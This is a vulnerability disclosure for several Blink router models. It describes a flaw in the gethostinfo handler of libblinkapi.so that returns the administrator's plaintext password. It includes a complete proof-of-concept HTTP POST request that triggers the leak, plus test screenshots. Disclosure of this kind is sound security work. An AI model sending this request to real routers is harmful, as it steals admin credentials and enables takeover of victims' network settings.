# Information Exposure Vulnerabilities in Various Blink Router Models

BUG_Author: waiwai

Vendor：[Blink](https://www.b-link.net.cn/)

Product: Multiple routers using libblinkapi.so component, including BL-AX5400P V1.0.19, BL-AX1800 V1.0.19, BL-AC3600 V1.0.22, BL-WR9000 V2.4.9, BL-AC1900 V1.0.2, BL-AC2100_AZ3 V1.0.4.

Vulnerability Files: libblinkapi.so

## Description

Multiple Blink routers contain a severe information disclosure vulnerability in the bs_GetHostInfo function within the libblinkapi.so shared library. When processing gethostinfo requests, this function directly returns a large amount of sensitive information to the client, including the administrator's plaintext password.After obtaining administrator privileges, attackers can perform the following malicious operations.Modify any router configuration, such as Wi-Fi passwords, DNS settings, etc.

## POC

```
POST /cgi-bin/lighttpd.cgi HTTP/1.1
Host: 192.168.2.2
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=admin
Referer: http://192.168.2.2/html/index.html
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Authorization: 1
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.2.2
Content-Length: 21

{"type":"gethostinfo"}
```



## Example

BL-AX5400P V1.0.19 Testing ：

![image-20250702113054448](./assets/Information_Exposure_Vulnerabilities_in_Various_Blink_Router_Models/image-20250702113054448.png)

BL-AC3600 V1.0.22 Testing：

![image-20250702113117133](./assets/Information_Exposure_Vulnerabilities_in_Various_Blink_Router_Models/image-20250702113117133.png)
